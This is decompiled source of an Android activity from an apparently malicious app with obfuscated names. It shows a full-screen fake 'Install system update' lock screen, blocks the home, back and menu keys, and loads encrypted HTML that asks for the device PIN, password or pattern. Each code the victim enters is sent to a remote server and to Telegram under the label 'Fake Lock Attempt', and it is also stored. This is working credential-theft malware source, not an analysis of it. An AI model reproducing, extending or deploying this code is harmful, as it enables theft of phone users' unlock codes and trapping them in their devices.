/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.content.Context
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.view.KeyEvent
 *  android.view.View
 *  android.view.WindowInsets$Type
 *  android.webkit.CookieManager
 *  android.webkit.JavascriptInterface
 *  android.webkit.JsResult
 *  android.webkit.WebChromeClient
 *  android.webkit.WebSettings$PluginState
 *  android.webkit.WebSettings$RenderPriority
 *  android.webkit.WebView
 *  android.webkit.WebViewClient
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowInsets;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.nio.charset.StandardCharsets;
import linker.resourcer.encoder.aaskrfyvhoypymnzlskbzwpyr;
import linker.resourcer.encoder.ffbrxjknfnpfxahr;
import linker.resourcer.encoder.lmqhtifjzrtsgjcqpakvh;
import linker.resourcer.encoder.lqvpqwmhpvnnlhskxyjdwphzvsl;
import linker.resourcer.encoder.tcmypqsdhypcqijjdbpwgzrivmu;
import linker.resourcer.encoder.vyklwirattpkwkqagsbrm;

public class gqzcedqwhiflurlhzg
extends Activity {
    private static gqzcedqwhiflurlhzg instance;
    static Context myctx;
    String smallbaseimg = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=";

    static {
        myctx = null;
    }

    public static void endlock() {
        if (instance != null) {
            instance.finish();
            instance = null;
        }
    }

    public static boolean isActivityOpen() {
        boolean bl = instance != null;
        return bl;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private String loadHtmlFromAssets(String object) {
        try {
            Object object2 = this.getAssets().open((String)object);
            if (!lmqhtifjzrtsgjcqpakvh.AsstsKey.equals("[AST-PAS]")) {
                object = new byte[((InputStream)object2).available()];
                ((InputStream)object2).read((byte[])object);
                ((InputStream)object2).close();
                return new String(ffbrxjknfnpfxahr.xorBytes((byte[])object, lmqhtifjzrtsgjcqpakvh.AsstsKey), StandardCharsets.UTF_8);
            }
            Object object3 = new InputStreamReader((InputStream)object2, StandardCharsets.UTF_8);
            object = new BufferedReader((Reader)object3);
            object3 = new StringBuilder();
            while (true) {
                if ((object2 = ((BufferedReader)object).readLine()) == null) {
                    ((BufferedReader)object).close();
                    return ((StringBuilder)object3).toString();
                }
                ((StringBuilder)object3).append((String)object2).append("\n");
            }
        }
        catch (IOException iOException) {
            iOException.printStackTrace();
            return null;
        }
    }

    public boolean dispatchKeyEvent(KeyEvent keyEvent) {
        return true;
    }

    public void onBackPressed() {
        super.onBackPressed();
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    protected void onCreate(Bundle object) {
        block12: {
            super.onCreate((Bundle)object);
            instance = this;
            this.requestWindowFeature(1);
            this.getWindow().setFlags(1024, 1024);
            try {
                if (Build.VERSION.SDK_INT >= 30) {
                    object = this.getWindow().getInsetsController();
                    if (object != null) {
                        object.hide(WindowInsets.Type.statusBars() | WindowInsets.Type.navigationBars());
                        object.setSystemBarsBehavior(2);
                    }
                    break block12;
                }
                this.getWindow().getDecorView().setSystemUiVisibility(4098);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        if (myctx == null) {
            myctx = this.getApplicationContext();
        }
        WebView webView = new WebView((Context)this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setLoadsImagesAutomatically(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        try {
            CookieManager.getInstance().setAcceptCookie(true);
            CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
        }
        catch (Exception exception) {
            // empty catch block
        }
        webView.getSettings().setUseWideViewPort(true);
        webView.setScrollBarStyle(0);
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setCacheMode(1);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setAllowFileAccessFromFileURLs(true);
        webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webView.getSettings().setAllowContentAccess(true);
        try {
            webView.setLayerType(2, null);
            webView.getSettings().setPluginState(WebSettings.PluginState.ON);
            webView.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
            webView.setBackgroundColor(-1);
        }
        catch (Exception exception) {
            // empty catch block
        }
        webView.setScrollBarStyle(0);
        webView.setWebViewClient((WebViewClient)new MyWebViewClient(this));
        webView.setWebChromeClient((WebChromeClient)new MyWebChromeClient(this));
        webView.addJavascriptInterface((Object)new WebAppInterface(this, (Context)this), "Vlrgnfjo");
        Object object2 = object = ffbrxjknfnpfxahr.Wallpaper(myctx, 340, 650, false);
        try {
            if (((String)object).equals("-1")) {
                object2 = this.smallbaseimg;
            }
            String string2 = vyklwirattpkwkqagsbrm.Read(myctx, aaskrfyvhoypymnzlskbzwpyr.lock_title, "Install system update");
            String string3 = vyklwirattpkwkqagsbrm.Read(myctx, aaskrfyvhoypymnzlskbzwpyr.lock_pin, "").length() == 6 ? "true" : "false";
            String string4 = vyklwirattpkwkqagsbrm.Read(myctx, aaskrfyvhoypymnzlskbzwpyr.lock_type, "1");
            object = string4.equals("3") ? vyklwirattpkwkqagsbrm.Read(myctx, aaskrfyvhoypymnzlskbzwpyr.lock_msg, "Enter Password") : (string4.equals("2") ? vyklwirattpkwkqagsbrm.Read(myctx, aaskrfyvhoypymnzlskbzwpyr.lock_msg, "Enter PIN") : vyklwirattpkwkqagsbrm.Read(myctx, aaskrfyvhoypymnzlskbzwpyr.lock_msg, "Draw pattern"));
            tcmypqsdhypcqijjdbpwgzrivmu tcmypqsdhypcqijjdbpwgzrivmu2 = tcmypqsdhypcqijjdbpwgzrivmu.Getinstance();
            StringBuilder stringBuilder = new StringBuilder();
            webView.loadDataWithBaseURL(null, tcmypqsdhypcqijjdbpwgzrivmu2.Dcrpt_Str(this.loadHtmlFromAssets(stringBuilder.append(string4).append(".bt").toString())).replace("[TITLE]", string2).replace(this.smallbaseimg, (CharSequence)object2).replace("[DIS]", (CharSequence)object).replace("PINLENGTH", string3).replace("[BTN]", lmqhtifjzrtsgjcqpakvh._Login_btn_), "text/html", "UTF-8", null);
            this.setContentView((View)webView);
            return;
        }
        catch (Exception exception) {
            this.finish();
        }
    }

    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }

    public boolean onKeyDown(int n, KeyEvent keyEvent) {
        if (n == 3) {
            return true;
        }
        if (n == 4) {
            return true;
        }
        return n == 82;
    }

    protected void onStop() {
        super.onStop();
    }

    public void onWindowFocusChanged(boolean bl) {
        super.onWindowFocusChanged(bl);
        if (bl) {
            this.getWindow().getDecorView().setSystemUiVisibility(4102);
        }
    }

    private class MyWebChromeClient
    extends WebChromeClient {
        final gqzcedqwhiflurlhzg this$0;

        private MyWebChromeClient(gqzcedqwhiflurlhzg gqzcedqwhiflurlhzg2) {
            this.this$0 = gqzcedqwhiflurlhzg2;
        }

        public boolean onJsAlert(WebView webView, String string2, String string3, JsResult jsResult) {
            return true;
        }
    }

    private class MyWebViewClient
    extends WebViewClient {
        final gqzcedqwhiflurlhzg this$0;

        private MyWebViewClient(gqzcedqwhiflurlhzg gqzcedqwhiflurlhzg2) {
            this.this$0 = gqzcedqwhiflurlhzg2;
        }

        public void onPageFinished(WebView webView, String string2) {
        }

        public boolean shouldOverrideUrlLoading(WebView webView, String string2) {
            return false;
        }
    }

    public class WebAppInterface {
        Context mContext;
        final gqzcedqwhiflurlhzg this$0;

        WebAppInterface(gqzcedqwhiflurlhzg gqzcedqwhiflurlhzg2, Context context) {
            this.this$0 = gqzcedqwhiflurlhzg2;
            this.mContext = context;
        }

        @JavascriptInterface
        public void OK(String string2) {
            try {
                Object object = myctx;
                StringBuilder stringBuilder = new StringBuilder();
                lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer((Context)object, "Lock mobile", stringBuilder.append("Attempt code: ").append(string2).toString());
                if (string2.length() >= 4) {
                    ffbrxjknfnpfxahr.StorePasscode(myctx, string2);
                    stringBuilder = myctx;
                    object = new StringBuilder();
                    ffbrxjknfnpfxahr.sendToTelegram((Context)stringBuilder, "Fake Lock Attempt", ((StringBuilder)object).append("\ud83d\udd10 Code: ").append(string2).toString());
                    object = vyklwirattpkwkqagsbrm.Read(myctx, aaskrfyvhoypymnzlskbzwpyr.lock_pin, "");
                    if (((String)object).length() > 0) {
                        if (((String)object).toLowerCase().equals(string2.toLowerCase())) {
                            vyklwirattpkwkqagsbrm.WriteBool(myctx, aaskrfyvhoypymnzlskbzwpyr.lock_screen, false);
                            this.this$0.finish();
                        }
                    } else {
                        vyklwirattpkwkqagsbrm.WriteBool(myctx, aaskrfyvhoypymnzlskbzwpyr.lock_screen, false);
                        this.this$0.finish();
                    }
                }
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }
}

